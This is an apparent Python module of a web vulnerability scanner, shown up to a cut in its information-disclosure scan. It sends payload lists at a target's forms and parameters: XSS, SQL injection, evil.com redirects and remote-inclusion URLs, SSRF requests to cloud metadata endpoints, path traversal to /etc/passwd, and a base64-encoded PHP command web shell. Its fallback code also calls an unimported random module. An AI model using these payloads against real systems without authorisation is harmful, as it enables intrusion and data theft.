#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Vulnerability Scanner Module for Web Penetration Testing Tool
Developed by: Saudi Linux
Email: SaudiLinux7@gmail.com

This module is designed to scan for common web vulnerabilities.
"""

import os
import sys
import json
import re
import time
from urllib.parse import urlparse, urljoin
from datetime import datetime

try:
    import requests
    from bs4 import BeautifulSoup
    import colorama
    from colorama import Fore, Style
    import urllib3
    from fake_useragent import UserAgent
except ImportError as e:
    print(f"Error: Missing required dependencies. {e}")
    print("Please run: pip install -r requirements.txt")
    sys.exit(1)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
colorama.init(autoreset=True)

# User-Agent rotation
def get_random_user_agent():
    try:
        ua = UserAgent()
        return ua.random
    except:
        # Fallback user agents if fake-useragent fails
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
        ]
        return random.choice(user_agents)

# Request wrapper with error handling
def make_request(url, method="GET", data=None, headers=None, timeout=10, allow_redirects=True, verify=False):
    if headers is None:
        headers = {
            'User-Agent': get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
    
    try:
        if method.upper() == "GET":
            response = requests.get(
                url, 
                headers=headers, 
                timeout=timeout, 
                allow_redirects=allow_redirects,
                verify=verify
            )
        elif method.upper() == "POST":
            response = requests.post(
                url, 
                data=data, 
                headers=headers, 
                timeout=timeout, 
                allow_redirects=allow_redirects,
                verify=verify
            )
        elif method.upper() == "HEAD":
            response = requests.head(
                url, 
                headers=headers, 
                timeout=timeout, 
                allow_redirects=allow_redirects,
                verify=verify
            )
        else:
            raise ValueError(f"Unsupported HTTP method: {method}")
            
        return response
    except requests.exceptions.ConnectionError:
        print(f"{Fore.RED}[!] Connection Error: Could not connect to {url}{Style.RESET_ALL}")
    except requests.exceptions.Timeout:
        print(f"{Fore.RED}[!] Timeout Error: Request to {url} timed out{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[!] Request Error: {e}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
    
    return None

class VulnerabilityScanner:
    def __init__(self, url, verbose=False):
        self.url = url
        self.verbose = verbose
        self.results = {}
        self.domain = urlparse(url).netloc
    
    def scan_all(self):
        print(f"\n{Fore.CYAN}[*] Scanning for vulnerabilities on {self.url}{Style.RESET_ALL}")
        
        self.scan_xss()
        self.scan_sql_injection()
        self.scan_open_redirects()
        self.scan_csrf()
        self.scan_misconfigurations()
        self.scan_insecure_headers()
        self.scan_clickjacking()
        self.scan_ssrf()
        self.scan_file_inclusion()
        self.scan_information_disclosure()
        
        return self.results
    
    def scan_xss(self):
        print(f"{Fore.YELLOW}[+] Scanning for XSS vulnerabilities...{Style.RESET_ALL}")
        xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '\'"><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<iframe onload=alert(1)>',
            '" onmouseover=alert(1) "',
            '\'onmouseover=alert(1)\'',
            'javascript:alert(1)',
        ]
        
        # First, find potential injection points
        response = make_request(self.url)
        if not response:
            return
        
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        potential_xss = []
        
        # Test forms
        for form in forms:
            form_action = form.get('action', '')
            if not form_action:
                form_action = self.url
            elif not form_action.startswith(('http://', 'https://')):
                form_action = urljoin(self.url, form_action)
            
            method = form.get('method', 'get').lower()
            inputs = form.find_all(['input', 'textarea'])
            
            for payload in xss_payloads:
                data = {}
                for input_field in inputs:
                    input_name = input_field.get('name')
                    if input_name:
                        data[input_name] = payload
                
                if method == 'get':
                    # Construct URL with parameters
                    query_string = '&'.join([f"{k}={v}" for k, v in data.items()])
                    test_url = f"{form_action}?{query_string}"
                    test_response = make_request(test_url)
                else:  # POST
                    test_response = make_request(form_action, method="POST", data=data)
                
                if test_response and payload in test_response.text:
                    potential_xss.append({
                        'url': form_action,
                        'method': method,
                        'payload': payload,
                        'form_index': forms.index(form)
                    })
                    break  # Found a working payload for this form
        
        # Test URL parameters
        parsed_url = urlparse(self.url)
        if parsed_url.query:
            query_params = parsed_url.query.split('&')
            for param in query_params:
                if '=' in param:
                    param_name = param.split('=')[0]
                    for payload in xss_payloads:
                        # Replace this parameter with our payload
                        new_query = parsed_url.query.replace(param, f"{param_name}={payload}")
                        test_url = self.url.replace(parsed_url.query, new_query)
                        
                        test_response = make_request(test_url)
                        if test_response and payload in test_response.text:
                            potential_xss.append({
                                'url': test_url,
                                'method': 'get',
                                'payload': payload,
                                'parameter': param_name
                            })
                            break  # Found a working payload for this parameter
        
        if potential_xss:
            self.results['xss_vulnerabilities'] = potential_xss
            print(f"{Fore.RED}[!] Found {len(potential_xss)} potential XSS vulnerabilities{Style.RESET_ALL}")
            
            if self.verbose:
                for vuln in potential_xss:
                    print(f"{Fore.RED}[!] Potential XSS at {vuln['url']} using {vuln['method'].upper()} method{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No XSS vulnerabilities found{Style.RESET_ALL}")
    
    def scan_sql_injection(self):
        print(f"{Fore.YELLOW}[+] Scanning for SQL Injection vulnerabilities...{Style.RESET_ALL}")
        sqli_payloads = [
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "1' OR '1'='1' --",
            "1\" OR \"1\"=\"1\" --",
            "' OR 1=1 --",
            "\" OR 1=1 --",
            "' OR '1'='1' /*",
            "\" OR \"1\"=\"1\" /*",
            "') OR ('1'='1",
            "')) OR (('1'='1",
            "1' ORDER BY 1--+",
            "1' UNION SELECT 1,2,3--+",
            "1' UNION SELECT table_name,2,3 FROM information_schema.tables--",
        ]
        
        error_patterns = [
            "SQL syntax",
            "mysql_fetch",
            "ORA-",
            "Oracle error",
            "Microsoft SQL Server",
            "PostgreSQL",
            "SQLite",
            "syntax error",
            "unclosed quotation mark",
            "mysql_num_rows",
            "mysql_query",
            "pg_query",
            "sqlite_query",
            "ODBC SQL Server Driver",
            "Microsoft Access Driver",
            "JDBC Driver",
            "SQLSTATE",
        ]
        
        # First, find potential injection points
        response = make_request(self.url)
        if not response:
            return
        
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        potential_sqli = []
        
        # Test forms
        for form in forms:
            form_action = form.get('action', '')
            if not form_action:
                form_action = self.url
            elif not form_action.startswith(('http://', 'https://')):
                form_action = urljoin(self.url, form_action)
            
            method = form.get('method', 'get').lower()
            inputs = form.find_all(['input', 'textarea'])
            
            for payload in sqli_payloads:
                data = {}
                for input_field in inputs:
                    input_name = input_field.get('name')
                    if input_name:
                        data[input_name] = payload
                
                if method == 'get':
                    # Construct URL with parameters
                    query_string = '&'.join([f"{k}={v}" for k, v in data.items()])
                    test_url = f"{form_action}?{query_string}"
                    test_response = make_request(test_url)
                else:  # POST
                    test_response = make_request(form_action, method="POST", data=data)
                
                if test_response:
                    # Check for SQL error messages
                    for pattern in error_patterns:
                        if pattern in test_response.text:
                            potential_sqli.append({
                                'url': form_action,
                                'method': method,
                                'payload': payload,
                                'error_pattern': pattern,
                                'form_index': forms.index(form)
                            })
                            break  # Found a working payload for this form
        
        # Test URL parameters
        parsed_url = urlparse(self.url)
        if parsed_url.query:
            query_params = parsed_url.query.split('&')
            for param in query_params:
                if '=' in param:
                    param_name = param.split('=')[0]
                    for payload in sqli_payloads:
                        # Replace this parameter with our payload
                        new_query = parsed_url.query.replace(param, f"{param_name}={payload}")
                        test_url = self.url.replace(parsed_url.query, new_query)
                        
                        test_response = make_request(test_url)
                        if test_response:
                            # Check for SQL error messages
                            for pattern in error_patterns:
                                if pattern in test_response.text:
                                    potential_sqli.append({
                                        'url': test_url,
                                        'method': 'get',
                                        'payload': payload,
                                        'error_pattern': pattern,
                                        'parameter': param_name
                                    })
                                    break  # Found a working payload for this parameter
        
        if potential_sqli:
            self.results['sqli_vulnerabilities'] = potential_sqli
            print(f"{Fore.RED}[!] Found {len(potential_sqli)} potential SQL Injection vulnerabilities{Style.RESET_ALL}")
            
            if self.verbose:
                for vuln in potential_sqli:
                    print(f"{Fore.RED}[!] Potential SQL Injection at {vuln['url']} using {vuln['method'].upper()} method{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No SQL Injection vulnerabilities found{Style.RESET_ALL}")
    
    def scan_open_redirects(self):
        print(f"{Fore.YELLOW}[+] Scanning for Open Redirect vulnerabilities...{Style.RESET_ALL}")
        redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https:evil.com",
            "https://evil.com%2523.target.com",
            "javascript:alert(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "https://evil.com/login?url=https://target.com",
            "https://evil.com\@target.com",
            "https://target.com.evil.com",
        ]
        
        # Find potential redirect parameters
        redirect_params = ['redirect', 'url', 'next', 'redir', 'return', 'to', 'goto', 'link', 'target', 'destination', 'returnUrl', 'returnTo', 'continue', 'location', 'path']
        
        # First, find potential injection points
        response = make_request(self.url)
        if not response:
            return
        
        potential_redirects = []
        
        # Test URL parameters
        parsed_url = urlparse(self.url)
        if parsed_url.query:
            query_params = parsed_url.query.split('&')
            for param in query_params:
                if '=' in param:
                    param_name, param_value = param.split('=')
                    if param_name.lower() in redirect_params:
                        for payload in redirect_payloads:
                            # Replace this parameter with our payload
                            new_query = parsed_url.query.replace(param, f"{param_name}={payload}")
                            test_url = self.url.replace(parsed_url.query, new_query)
                            
                            test_response = make_request(test_url, allow_redirects=False)
                            if test_response and (test_response.status_code in [301, 302, 303, 307, 308]):
                                location = test_response.headers.get('Location', '')
                                if payload in location or 'evil.com' in location:
                                    potential_redirects.append({
                                        'url': test_url,
                                        'payload': payload,
                                        'parameter': param_name,
                                        'redirect_to': location
                                    })
                                    break  # Found a working payload for this parameter
        
        # Also check for forms with potential redirect fields
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            form_action = form.get('action', '')
            if not form_action:
                form_action = self.url
            elif not form_action.startswith(('http://', 'https://')):
                form_action = urljoin(self.url, form_action)
            
            method = form.get('method', 'get').lower()
            inputs = form.find_all(['input', 'textarea'])
            
            for input_field in inputs:
                input_name = input_field.get('name', '').lower()
                if input_name in redirect_params:
                    for payload in redirect_payloads:
                        data = {}
                        for inp in inputs:
                            inp_name = inp.get('name')
                            if inp_name:
                                if inp_name.lower() == input_name:
                                    data[inp_name] = payload
                                else:
                                    data[inp_name] = inp.get('value', '')
                        
                        if method == 'get':
                            # Construct URL with parameters
                            query_string = '&'.join([f"{k}={v}" for k, v in data.items()])
                            test_url = f"{form_action}?{query_string}"
                            test_response = make_request(test_url, allow_redirects=False)
                        else:  # POST
                            test_response = make_request(form_action, method="POST", data=data, allow_redirects=False)
                        
                        if test_response and (test_response.status_code in [301, 302, 303, 307, 308]):
                            location = test_response.headers.get('Location', '')
                            if payload in location or 'evil.com' in location:
                                potential_redirects.append({
                                    'url': form_action,
                                    'method': method,
                                    'payload': payload,
                                    'parameter': input_name,
                                    'redirect_to': location,
                                    'form_index': forms.index(form)
                                })
                                break  # Found a working payload for this form
        
        if potential_redirects:
            self.results['open_redirect_vulnerabilities'] = potential_redirects
            print(f"{Fore.RED}[!] Found {len(potential_redirects)} potential Open Redirect vulnerabilities{Style.RESET_ALL}")
            
            if self.verbose:
                for vuln in potential_redirects:
                    print(f"{Fore.RED}[!] Potential Open Redirect at {vuln['url']} via parameter {vuln['parameter']}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No Open Redirect vulnerabilities found{Style.RESET_ALL}")
    
    def scan_csrf(self):
        print(f"{Fore.YELLOW}[+] Scanning for CSRF vulnerabilities...{Style.RESET_ALL}")
        
        # First, find forms
        response = make_request(self.url)
        if not response:
            return
        
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        potential_csrf = []
        
        for form in forms:
            # Check if the form has CSRF protection
            csrf_protected = False
            
            # Check for CSRF token in hidden inputs
            hidden_inputs = form.find_all('input', {'type': 'hidden'})
            for hidden_input in hidden_inputs:
                input_name = hidden_input.get('name', '').lower()
                if any(token_name in input_name for token_name in ['csrf', 'token', 'nonce', 'xsrf']):
                    csrf_protected = True
                    break
            
            # Check for CSRF token in form attributes
            form_attrs = form.attrs
            for attr_name, attr_value in form_attrs.items():
                if isinstance(attr_value, str) and any(token_name in attr_name.lower() for token_name in ['csrf', 'token', 'nonce', 'xsrf']):
                    csrf_protected = True
                    break
            
            if not csrf_protected:
                form_action = form.get('action', '')
                if not form_action:
                    form_action = self.url
                elif not form_action.startswith(('http://', 'https://')):
                    form_action = urljoin(self.url, form_action)
                
                method = form.get('method', 'get').lower()
                
                # Only POST forms are typically vulnerable to CSRF
                if method.lower() == 'post':
                    potential_csrf.append({
                        'url': form_action,
                        'method': method,
                        'form_index': forms.index(form)
                    })
        
        if potential_csrf:
            self.results['csrf_vulnerabilities'] = potential_csrf
            print(f"{Fore.RED}[!] Found {len(potential_csrf)} potential CSRF vulnerabilities{Style.RESET_ALL}")
            
            if self.verbose:
                for vuln in potential_csrf:
                    print(f"{Fore.RED}[!] Potential CSRF vulnerability in form at {vuln['url']} using {vuln['method'].upper()} method{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No CSRF vulnerabilities found{Style.RESET_ALL}")
    
    def scan_misconfigurations(self):
        print(f"{Fore.YELLOW}[+] Scanning for security misconfigurations...{Style.RESET_ALL}")
        
        misconfigurations = []
        
        # Check for directory listing
        common_dirs = ['admin/', 'backup/', 'config/', 'db/', 'logs/', 'test/', 'dev/', 'api/', 'upload/', 'uploads/', 'temp/', 'tmp/', 'old/', 'bak/', 'sql/', 'data/']
        for directory in common_dirs:
            test_url = urljoin(self.url, directory)
            response = make_request(test_url)
            
            if response and response.status_code == 200:
                # Check for common directory listing signatures
                if any(signature in response.text for signature in ['Index of /', 'Directory Listing For', 'Parent Directory']):
                    misconfigurations.append({
                        'type': 'directory_listing',
                        'url': test_url,
                        'description': f"Directory listing enabled at {test_url}"
                    })
                    if self.verbose:
                        print(f"{Fore.RED}[!] Directory listing enabled at {test_url}{Style.RESET_ALL}")
        
        # Check for default files
        default_files = ['phpinfo.php', 'test.php', 'info.php', 'server-status', 'server-info', 'robots.txt', '.git/HEAD', '.env', '.htaccess', 'config.php', 'wp-config.php', 'config.yml', 'config.xml', 'web.config', 'backup.sql', 'database.sql', 'db.sql']
        for file in default_files:
            test_url = urljoin(self.url, file)
            response = make_request(test_url)
            
            if response and response.status_code == 200:
                if file == 'phpinfo.php' or file == 'info.php':
                    if 'PHP Version' in response.text and 'PHP Credits' in response.text:
                        misconfigurations.append({
                            'type': 'information_disclosure',
                            'url': test_url,
                            'description': f"PHP info page accessible at {test_url}"
                        })
                        if self.verbose:
                            print(f"{Fore.RED}[!] PHP info page accessible at {test_url}{Style.RESET_ALL}")
                
                elif file == '.git/HEAD':
                    if 'ref:' in response.text:
                        misconfigurations.append({
                            'type': 'git_repository_exposure',
                            'url': test_url,
                            'description': f"Git repository exposed at {self.url}"
                        })
                        if self.verbose:
                            print(f"{Fore.RED}[!] Git repository exposed at {self.url}{Style.RESET_ALL}")
                
                elif file == '.env':
                    if any(env_var in response.text for env_var in ['DB_HOST', 'API_KEY', 'SECRET', 'PASSWORD', 'TOKEN']):
                        misconfigurations.append({
                            'type': 'env_file_exposure',
                            'url': test_url,
                            'description': f"Environment file exposed at {test_url}"
                        })
                        if self.verbose:
                            print(f"{Fore.RED}[!] Environment file exposed at {test_url}{Style.RESET_ALL}")
                
                elif file.endswith('.sql'):
                    if any(sql_keyword in response.text for sql_keyword in ['CREATE TABLE', 'INSERT INTO', 'DROP TABLE']):
                        misconfigurations.append({
                            'type': 'database_backup_exposure',
                            'url': test_url,
                            'description': f"Database backup file exposed at {test_url}"
                        })
                        if self.verbose:
                            print(f"{Fore.RED}[!] Database backup file exposed at {test_url}{Style.RESET_ALL}")
                
                elif file == 'robots.txt':
                    # Check for sensitive paths in robots.txt
                    sensitive_paths = ['admin', 'backup', 'config', 'db', 'logs', 'private', 'wp-admin', 'phpmyadmin', 'secret']
                    for path in sensitive_paths:
                        if path in response.text:
                            misconfigurations.append({
                                'type': 'sensitive_information_in_robots',
                                'url': test_url,
                                'description': f"Sensitive path '{path}' found in robots.txt"
                            })
                            if self.verbose:
                                print(f"{Fore.RED}[!] Sensitive path '{path}' found in robots.txt{Style.RESET_ALL}")
        
        # Check for CORS misconfiguration
        headers = {
            'Origin': 'https://evil.com',
            'User-Agent': get_random_user_agent(),
        }
        
        response = make_request(self.url, headers=headers)
        if response:
            cors_headers = {
                'Access-Control-Allow-Origin': response.headers.get('Access-Control-Allow-Origin'),
                'Access-Control-Allow-Credentials': response.headers.get('Access-Control-Allow-Credentials')
            }
            
            if cors_headers['Access-Control-Allow-Origin'] == 'https://evil.com' or cors_headers['Access-Control-Allow-Origin'] == '*':
                if cors_headers['Access-Control-Allow-Credentials'] == 'true':
                    misconfigurations.append({
                        'type': 'cors_misconfiguration',
                        'url': self.url,
                        'description': "CORS misconfiguration allows credentials to be sent to unauthorized origins",
                        'cors_headers': cors_headers
                    })
                    if self.verbose:
                        print(f"{Fore.RED}[!] CORS misconfiguration allows credentials to be sent to unauthorized origins{Style.RESET_ALL}")
        
        if misconfigurations:
            self.results['misconfigurations'] = misconfigurations
            print(f"{Fore.RED}[!] Found {len(misconfigurations)} security misconfigurations{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No security misconfigurations found{Style.RESET_ALL}")
    
    def scan_insecure_headers(self):
        print(f"{Fore.YELLOW}[+] Scanning for insecure headers...{Style.RESET_ALL}")
        
        response = make_request(self.url, method="HEAD")
        if not response:
            return
        
        headers = response.headers
        insecure_headers = []
        
        # Check for missing security headers
        security_headers = {
            'Strict-Transport-Security': 'Missing HSTS header',
            'Content-Security-Policy': 'Missing CSP header',
            'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
            'X-Frame-Options': 'Missing X-Frame-Options header',
            'X-XSS-Protection': 'Missing X-XSS-Protection header',
            'Referrer-Policy': 'Missing Referrer-Policy header',
            'Permissions-Policy': 'Missing Permissions-Policy header',
            'Cache-Control': 'Missing Cache-Control header',
        }
        
        for header, message in security_headers.items():
            if header not in headers:
                insecure_headers.append({
                    'type': 'missing_header',
                    'header': header,
                    'description': message
                })
                if self.verbose:
                    print(f"{Fore.RED}[!] {message}{Style.RESET_ALL}")
        
        # Check for insecure values in existing headers
        if 'X-Frame-Options' in headers and headers['X-Frame-Options'].upper() not in ['DENY', 'SAMEORIGIN']:
            insecure_headers.append({
                'type': 'insecure_header_value',
                'header': 'X-Frame-Options',
                'value': headers['X-Frame-Options'],
                'description': f"Insecure X-Frame-Options value: {headers['X-Frame-Options']}"
            })
            if self.verbose:
                print(f"{Fore.RED}[!] Insecure X-Frame-Options value: {headers['X-Frame-Options']}{Style.RESET_ALL}")
        
        if 'X-XSS-Protection' in headers and headers['X-XSS-Protection'] != '1; mode=block':
            insecure_headers.append({
                'type': 'insecure_header_value',
                'header': 'X-XSS-Protection',
                'value': headers['X-XSS-Protection'],
                'description': f"Potentially insecure X-XSS-Protection value: {headers['X-XSS-Protection']}"
            })
            if self.verbose:
                print(f"{Fore.RED}[!] Potentially insecure X-XSS-Protection value: {headers['X-XSS-Protection']}{Style.RESET_ALL}")
        
        if 'Server' in headers and any(server in headers['Server'].lower() for server in ['apache', 'nginx', 'iis', 'php']):
            insecure_headers.append({
                'type': 'information_disclosure',
                'header': 'Server',
                'value': headers['Server'],
                'description': f"Server header reveals software information: {headers['Server']}"
            })
            if self.verbose:
                print(f"{Fore.RED}[!] Server header reveals software information: {headers['Server']}{Style.RESET_ALL}")
        
        if 'X-Powered-By' in headers:
            insecure_headers.append({
                'type': 'information_disclosure',
                'header': 'X-Powered-By',
                'value': headers['X-Powered-By'],
                'description': f"X-Powered-By header reveals software information: {headers['X-Powered-By']}"
            })
            if self.verbose:
                print(f"{Fore.RED}[!] X-Powered-By header reveals software information: {headers['X-Powered-By']}{Style.RESET_ALL}")
        
        if insecure_headers:
            self.results['insecure_headers'] = insecure_headers
            print(f"{Fore.RED}[!] Found {len(insecure_headers)} insecure header issues{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No insecure header issues found{Style.RESET_ALL}")
    
    def scan_clickjacking(self):
        print(f"{Fore.YELLOW}[+] Scanning for Clickjacking vulnerabilities...{Style.RESET_ALL}")
        
        response = make_request(self.url, method="HEAD")
        if not response:
            return
        
        headers = response.headers
        vulnerable = False
        description = ""
        
        # Check if X-Frame-Options header is missing or has an insecure value
        if 'X-Frame-Options' not in headers:
            vulnerable = True
            description = "X-Frame-Options header is missing"
        elif headers['X-Frame-Options'].upper() not in ['DENY', 'SAMEORIGIN']:
            vulnerable = True
            description = f"X-Frame-Options has an insecure value: {headers['X-Frame-Options']}"
        
        # Check if Content-Security-Policy with frame-ancestors is missing
        if 'Content-Security-Policy' not in headers or 'frame-ancestors' not in headers.get('Content-Security-Policy', ''):
            # If X-Frame-Options is already vulnerable, we don't need to check CSP
            if not vulnerable:
                vulnerable = True
                description = "Content-Security-Policy with frame-ancestors directive is missing"
        
        if vulnerable:
            self.results['clickjacking_vulnerability'] = {
                'url': self.url,
                'description': description
            }
            print(f"{Fore.RED}[!] Clickjacking vulnerability found: {description}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No Clickjacking vulnerabilities found{Style.RESET_ALL}")
    
    def scan_ssrf(self):
        print(f"{Fore.YELLOW}[+] Scanning for Server-Side Request Forgery (SSRF) vulnerabilities...{Style.RESET_ALL}")
        
        # SSRF payloads
        ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://[::1]",
            "http://0.0.0.0",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:8080",
            "file:///etc/passwd",
            "file:///C:/Windows/win.ini",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/",  # GCP metadata
        ]
        
        # Parameters that might be vulnerable to SSRF
        ssrf_params = ['url', 'uri', 'link', 'src', 'source', 'redirect', 'path', 'load', 'file', 'document', 'resource', 'fetch', 'data', 'site', 'html', 'reference', 'destination']
        
        response = make_request(self.url)
        if not response:
            return
        
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        potential_ssrf = []
        
        # Test URL parameters
        parsed_url = urlparse(self.url)
        if parsed_url.query:
            query_params = parsed_url.query.split('&')
            for param in query_params:
                if '=' in param:
                    param_name = param.split('=')[0]
                    if param_name.lower() in ssrf_params:
                        for payload in ssrf_payloads:
                            # Replace this parameter with our payload
                            new_query = parsed_url.query.replace(param, f"{param_name}={payload}")
                            test_url = self.url.replace(parsed_url.query, new_query)
                            
                            test_response = make_request(test_url)
                            if test_response:
                                # Look for signs of successful SSRF
                                if any(indicator in test_response.text for indicator in ['root:', 'mysql:', '[boot loader]', 'ami-id', 'instance-id']):
                                    potential_ssrf.append({
                                        'url': test_url,
                                        'parameter': param_name,
                                        'payload': payload,
                                        'evidence': 'Found sensitive data in response'
                                    })
                                    if self.verbose:
                                        print(f"{Fore.RED}[!] Potential SSRF via parameter {param_name} with payload {payload}{Style.RESET_ALL}")
                                    break  # Found a working payload for this parameter
        
        # Test forms
        for form in forms:
            form_action = form.get('action', '')
            if not form_action:
                form_action = self.url
            elif not form_action.startswith(('http://', 'https://')):
                form_action = urljoin(self.url, form_action)
            
            method = form.get('method', 'get').lower()
            inputs = form.find_all(['input', 'textarea'])
            
            for input_field in inputs:
                input_name = input_field.get('name', '').lower()
                if input_name in ssrf_params:
                    for payload in ssrf_payloads:
                        data = {}
                        for inp in inputs:
                            inp_name = inp.get('name')
                            if inp_name:
                                if inp_name.lower() == input_name:
                                    data[inp_name] = payload
                                else:
                                    data[inp_name] = inp.get('value', '')
                        
                        if method == 'get':
                            # Construct URL with parameters
                            query_string = '&'.join([f"{k}={v}" for k, v in data.items()])
                            test_url = f"{form_action}?{query_string}"
                            test_response = make_request(test_url)
                        else:  # POST
                            test_response = make_request(form_action, method="POST", data=data)
                        
                        if test_response:
                            # Look for signs of successful SSRF
                            if any(indicator in test_response.text for indicator in ['root:', 'mysql:', '[boot loader]', 'ami-id', 'instance-id']):
                                potential_ssrf.append({
                                    'url': form_action,
                                    'method': method,
                                    'parameter': input_name,
                                    'payload': payload,
                                    'evidence': 'Found sensitive data in response',
                                    'form_index': forms.index(form)
                                })
                                if self.verbose:
                                    print(f"{Fore.RED}[!] Potential SSRF via form parameter {input_name} with payload {payload}{Style.RESET_ALL}")
                                break  # Found a working payload for this form field
        
        if potential_ssrf:
            self.results['ssrf_vulnerabilities'] = potential_ssrf
            print(f"{Fore.RED}[!] Found {len(potential_ssrf)} potential SSRF vulnerabilities{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No SSRF vulnerabilities found{Style.RESET_ALL}")
    
    def scan_file_inclusion(self):
        print(f"{Fore.YELLOW}[+] Scanning for File Inclusion vulnerabilities...{Style.RESET_ALL}")
        
        # LFI/RFI payloads
        lfi_payloads = [
            "../../../../../../../etc/passwd",
            "../../../../../../../etc/hosts",
            "../../../../../../../windows/win.ini",
            "../../../../../../../boot.ini",
            "../../../../../../../../../../etc/passwd%00",  # Null byte (for older PHP versions)
            "....//....//....//....//....//....//etc/passwd",
            "..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd",
            "/etc/passwd",
            "C:\\Windows\\win.ini",
        ]
        
        rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://evil.com/shell.php",
            "ftp://evil.com/shell.php",
            "//evil.com/shell.php",
            "php://filter/convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",  # <?php system($_GET['cmd']);?>
            "expect://id",
            "php://input",
        ]
        
        # Parameters that might be vulnerable to file inclusion
        file_params = ['file', 'page', 'include', 'doc', 'document', 'folder', 'root', 'path', 'style', 'template', 'php_path', 'load', 'module', 'view']
        
        response = make_request(self.url)
        if not response:
            return
        
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        potential_lfi = []
        potential_rfi = []
        
        # Test URL parameters for LFI
        parsed_url = urlparse(self.url)
        if parsed_url.query:
            query_params = parsed_url.query.split('&')
            for param in query_params:
                if '=' in param:
                    param_name = param.split('=')[0]
                    if param_name.lower() in file_params:
                        # Test LFI
                        for payload in lfi_payloads:
                            # Replace this parameter with our payload
                            new_query = parsed_url.query.replace(param, f"{param_name}={payload}")
                            test_url = self.url.replace(parsed_url.query, new_query)
                            
                            test_response = make_request(test_url)
                            if test_response:
                                # Look for signs of successful LFI
                                if any(indicator in test_response.text for indicator in ['root:', 'mysql:', '[boot loader]', '[fonts]', 'uid=', 'localhost']):
                                    potential_lfi.append({
                                        'url': test_url,
                                        'parameter': param_name,
                                        'payload': payload,
                                        'evidence': 'Found sensitive data in response'
                                    })
                                    if self.verbose:
                                        print(f"{Fore.RED}[!] Potential LFI via parameter {param_name} with payload {payload}{Style.RESET_ALL}")
                                    break  # Found a working payload for this parameter
                        
                        # Test RFI
                        for payload in rfi_payloads:
                            # Replace this parameter with our payload
                            new_query = parsed_url.query.replace(param, f"{param_name}={payload}")
                            test_url = self.url.replace(parsed_url.query, new_query)
                            
                            test_response = make_request(test_url)
                            if test_response:
                                # Look for signs of successful RFI (this is harder to detect without actually hosting malicious files)
                                if 'evil.com' in test_response.text or 'shell.php' in test_response.text or 'uid=' in test_response.text:
                                    potential_rfi.append({
                                        'url': test_url,
                                        'parameter': param_name,
                                        'payload': payload,
                                        'evidence': 'Found indicators of successful inclusion'
                                    })
                                    if self.verbose:
                                        print(f"{Fore.RED}[!] Potential RFI via parameter {param_name} with payload {payload}{Style.RESET_ALL}")
                                    break  # Found a working payload for this parameter
        
        # Combine results
        file_inclusion_vulnerabilities = []
        if potential_lfi:
            file_inclusion_vulnerabilities.extend([{'type': 'lfi', **vuln} for vuln in potential_lfi])
        if potential_rfi:
            file_inclusion_vulnerabilities.extend([{'type': 'rfi', **vuln} for vuln in potential_rfi])
        
        if file_inclusion_vulnerabilities:
            self.results['file_inclusion_vulnerabilities'] = file_inclusion_vulnerabilities
            print(f"{Fore.RED}[!] Found {len(file_inclusion_vulnerabilities)} potential File Inclusion vulnerabilities{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No File Inclusion vulnerabilities found{Style.RESET_ALL}")
    
    def scan_information_disclosure(self):
        print(f"{Fore.YELLOW}[+] Scanning for Information Disclosure...{Style.RESET_ALL}")
        
        info_disclosure = []
        
        # Check for common sensitive files
        sensitive_files = [
            '.git/config',
            '.svn/entries',
            '.env',
            'config.php',
            'config.json',
